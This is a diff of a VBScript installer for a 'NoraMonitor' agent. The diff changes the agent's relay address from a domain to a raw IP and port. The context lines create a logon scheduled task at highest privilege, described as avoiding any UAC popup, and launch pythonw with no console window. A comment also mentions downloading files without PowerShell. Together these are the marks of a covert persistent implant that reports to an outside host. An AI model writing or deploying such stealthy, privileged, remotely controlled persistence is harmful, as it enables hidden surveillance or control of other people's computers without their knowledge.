@@ -55,12 +55,12 @@ End If
 
 ' ── Register auto-start via Task Scheduler (elevated at login, no UAC popup) ──
 Dim taskCmd
-taskCmd = "cmd /c set NORA_RELAY=https://mon.eclipselivecam.online & cd /d """ & DIR & """ & pythonw """ & DIR & "\app.py"""
+taskCmd = "cmd /c set NORA_RELAY=http://16.55.3.205:5000 & cd /d """ & DIR & """ & pythonw """ & DIR & "\app.py"""
 sh.Run "schtasks /delete /tn ""NoraMonitor"" /f", 0, True
 sh.Run "schtasks /create /tn ""NoraMonitor"" /tr """ & taskCmd & """ /sc onlogon /rl highest /f", 0, True
 
 ' ── Launch agent now (first run, no console window) ───────────────────────────
-sh.Environment("Process")("NORA_RELAY") = "https://mon.eclipselivecam.online"
+sh.Environment("Process")("NORA_RELAY") = "http://16.55.3.205:5000"
 sh.Run "cmd /c start """" /D """ & DIR & """ pythonw """ & DIR & "\app.py""", 0, False
 
 ' ── Helper: download any file without PowerShell ─────────────────────────────
